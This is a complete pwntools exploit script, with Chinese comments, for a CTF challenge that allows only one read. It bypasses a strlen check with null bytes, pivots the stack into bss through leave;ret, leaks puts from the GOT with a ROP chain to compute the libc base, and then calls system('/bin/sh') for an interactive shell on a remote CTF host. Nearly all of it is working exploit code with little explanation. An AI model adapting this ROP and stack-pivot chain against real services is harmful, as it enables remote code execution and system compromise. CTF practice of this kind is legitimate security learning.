#只含一次read的栈迁移
#本题可以一开始利用部分覆盖来泄露rbp进而迁移到栈上的，但是我没有意识到而签到了bss导致遇到了许多权限问题
from pwn import*
context.log_level = 'debug'
# p = process('./pwn')
p=remote('ctf.npusec.org.cn',12822)
elf=ELF('./pwn')
bss=elf.bss()
fake_addr=bss+0x900
main_addr=0x4011CE

pop_rdi=0x4012f3
ret=0x40101a
leave_ret=0x40122a
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
printf_got=elf.got['printf']

# gdb.attach(p,'''
#            b*0x40122A
#            b*0x401208 ''')
# pause()
payload=b'\x00'*0x30+p64(fake_addr+0x30)+p64(main_addr)
#b'\x00'可以截断strlen从而绕过检查
p.sendafter('name?',payload)
payload=p64(fake_addr)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)+b'\x00'*8+p64(fake_addr)+p64(leave_ret)
p.send(payload)

# pause()
p.recvuntil(b'\n')
leak=p.recvuntil(b'\n')
leak_addr=u64(leak.strip()[-6:].ljust(8,b'\x00'))
libc_base=leak_addr-0x087be0
system_addr=libc_base+0x058750
binsh_addr=libc_base+0x1cb42f
print('leak_addr:'+hex(leak_addr))
print('libc_base:'+hex(libc_base))
print('system_addr:'+hex(system_addr))
print('binsh_addr:'+hex(binsh_addr))

payload=p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+b'\x00'*24+p64(fake_addr-0x30-8)+p64(leave_ret)
p.send(payload)
p.interactive()




